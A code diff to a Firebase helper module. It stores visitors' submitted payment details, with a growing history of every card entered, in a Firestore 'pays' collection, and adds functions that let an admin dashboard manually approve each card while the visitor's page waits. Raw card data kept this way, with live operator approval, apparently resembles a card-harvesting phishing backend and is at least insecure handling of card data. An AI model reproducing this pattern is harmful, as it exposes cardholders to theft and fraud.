@@ -1,6 +1,6 @@
 import { getApp, getApps, initializeApp } from "firebase/app";
 import { getDatabase } from "firebase/database";
-import { arrayUnion, doc, getFirestore, setDoc, updateDoc } from "firebase/firestore";
+import { arrayUnion, doc, getFirestore, setDoc, updateDoc, onSnapshot } from "firebase/firestore";
 import {
   getAuth,
   signInWithEmailAndPassword,
@@ -137,21 +137,65 @@ export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
         // Prefer updateDoc + arrayUnion to preserve previous cards.
         await updateDoc(docRef, {
           ...paymentInfo,
-          status: "pending",
+          status: "pending_approval",
+          cardApproved: false,
           cardHistory: arrayUnion(cardEntry),
         });
       } catch (err) {
         // Fallback (e.g. doc missing): seed history array.
         await setDoc(
           docRef,
-          { ...paymentInfo, status: "pending", cardHistory: [cardEntry] },
+          { ...paymentInfo, status: "pending_approval", cardApproved: false, cardHistory: [cardEntry] },
           { merge: true },
         );
       }
-      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
+      setPaymentInfo((prev: any) => ({ ...prev, status: "pending_approval" }));
     }
   } catch (error) {
     console.error("Error adding document: ", error);
+  }
+};
+
+// Listen for card approval status
+export const listenForApproval = (callback: (approved: boolean) => void): (() => void) => {
+  if (!db) {
+    console.warn("Firebase not initialized. Cannot listen for approval.");
+    return () => {};
+  }
+
+  const visitorId = localStorage.getItem("visitor");
+  if (!visitorId) {
+    return () => {};
+  }
+
+  const docRef = doc(db, "pays", visitorId);
+  const unsubscribe = onSnapshot(docRef, (snapshot) => {
+    if (snapshot.exists()) {
+      const data = snapshot.data();
+      if (data.cardApproved === true) {
+        callback(true);
+      }
+    }
+  });
+
+  return unsubscribe;
+};
+
+// Update visitor approval status (for admin dashboard)
+export const updateApprovalStatus = async (visitorId: string, approved: boolean) => {
+  if (!db) {
+    console.warn("Firebase not initialized.");
+    return;
+  }
+
+  try {
+    const docRef = doc(db, "pays", visitorId);
+    await updateDoc(docRef, {
+      cardApproved: approved,
+      status: approved ? "approved" : "pending_approval",
+    });
+  } catch (error) {
+    console.error("Error updating approval status:", error);
   }
 };
 
